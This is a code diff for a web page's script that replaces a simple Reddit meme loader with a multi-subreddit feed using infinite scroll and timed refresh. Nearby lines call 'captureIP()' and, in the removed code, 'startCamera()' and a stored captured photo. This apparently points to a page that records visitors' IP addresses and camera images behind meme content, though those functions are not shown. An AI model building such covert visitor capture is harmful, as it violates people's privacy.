@@ -199,32 +199,53 @@
 }
 
 captureIP(); // Call the function here
+let memesContainer = document.getElementById('memes'); // Make sure your HTML has this div
+let after = {}; // Stores pagination tokens for each subreddit
+let subreddits = ["memes", "dankmemes", "funny", "wholesomememes"]; // Add more if needed
+let subredditIndex = 0;
 
-        async function fetchMemes(after) {
-            fetch(`https://www.reddit.com/r/memes.json?after=${after}`)
-                .then(response => response.json())
-                .then(data => {
-                    data.data.children.forEach(meme => {
-                        let memeImg = document.createElement('img');
-                        memeImg.src = meme.data.url;
-                        memesContainer.appendChild(memeImg);
-                    });
-                    fetchMemes(data.data.after);
-                })
-                .catch(error => console.error("Error fetching memes:", error));
-        }
+async function fetchMemes(loadMore = false) {
+    try {
+        let subreddit = subreddits[subredditIndex]; // Rotate through subreddits
+        let url = `https://www.reddit.com/r/${subreddit}.json`;
+        if (after[subreddit] && loadMore) url += `?after=${after[subreddit]}`;
 
-        function scrollToTop() {
-            window.scrollTo({ top: 0, behavior: 'smooth' });
-        }
+        const response = await fetch(url);
+        const data = await response.json();
+        const memes = data.data.children;
 
-        if (localStorage.getItem('capturedPhoto')) {
-            capturedPhoto.src = localStorage.getItem('capturedPhoto');
-            capturedPhoto.style.display = 'block';
-        }
+        if (!memes.length) return;
 
-        startCamera();
-        fetchMemes(null);
+        after[subreddit] = data.data.after; // Update pagination token
+        subredditIndex = (subredditIndex + 1) % subreddits.length; // Switch subreddit
+
+        memes.forEach(meme => {
+            let memeImg = document.createElement('img');
+            memeImg.src = meme.data.url;
+            memeImg.style.width = "100%";
+            memeImg.style.maxWidth = "300px";
+            memeImg.style.borderRadius = "10px";
+            memeImg.style.marginTop = "10px";
+            memesContainer.appendChild(memeImg);
+        });
+    } catch (error) {
+        console.error("Error fetching memes:", error);
+    }
+}
+
+// Auto-fetch new memes every 30 seconds
+setInterval(() => fetchMemes(false), 30000);
+
+// Infinite scroll - load more memes when user scrolls to bottom
+window.addEventListener("scroll", () => {
+    if (window.innerHeight + window.scrollY >= document.body.offsetHeight - 100) {
+        fetchMemes(true); // Load older memes
+    }
+});
+
+// Initial meme fetch
+fetchMemes();
+        
     </script>
 </body>
 </html>
